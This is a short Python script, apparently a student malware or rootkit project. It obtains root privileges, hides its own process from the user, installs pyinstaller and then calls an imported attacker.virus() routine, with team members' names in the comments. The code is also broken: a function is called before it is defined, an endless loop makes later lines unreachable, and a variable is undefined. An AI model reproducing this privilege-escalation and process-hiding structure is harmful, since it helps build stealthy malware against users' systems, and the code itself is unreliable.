import root
import attacker
import os
import time
from hideProcess import hideProcess
from createProcess import createProcess
from showProcess import showProcess

if __name__ == "__main__":
    #nouri
    root_privilege = root.get_root()

    if root_privilege == True:
        #benkhaled 
        proc()
        #belhadj
        attacker.virus()
    else:
        next = "only user commands"
 


        
def proc():
        username = os.getlogin()
        os.system("mkdir /home/{}/empty".format(username))

        # install pyinstaller
        os.system("pip install -U pyinstaller")

        PID_APP = os.getpid()
        print("Main PID: ", PID_APP)

        # Hide Main App Process
        hideProcess(PID_APP, username)
        current_time = time.time()
        while 1:
            # print counter in seconds
            print("Counter: ", int(time.time()%current_time), end="\r")
        print('Pause 20 seconds before showing subprocess ...')
        time.sleep(20)

        # Show "sleep" Process
        print('You can see the subprocess now')
        showProcess(PID_PROCESS)
   

